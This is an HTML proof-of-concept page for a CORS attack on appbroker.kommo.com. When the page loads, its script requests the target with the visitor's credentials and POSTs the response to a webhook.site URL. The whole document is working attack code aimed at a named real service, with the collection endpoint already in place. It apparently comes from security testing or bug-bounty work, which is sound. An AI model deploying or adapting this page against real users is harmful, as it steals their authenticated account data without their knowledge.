<!DOCTYPE html>
<html>
  <head><title>CORS PoC</title></head>
  <body>
    <h1>CORS PoC - appbroker.kommo.com</h1>
    <script>
      fetch("https://appbroker.kommo.com", {
        credentials: "include"
      })
      .then(res => res.text())
      .then(data => {
        console.log("Response:", data);
        fetch("https://webhook.site/08b7ddee-7f30-4294-bcde-c34c778e5e26", {
          method: "POST",
          body: data,
          mode: "no-cors"
        });
      })
      .catch(err => {
        console.error("Error:", err);
      });
    </script>
  </body>
</html>
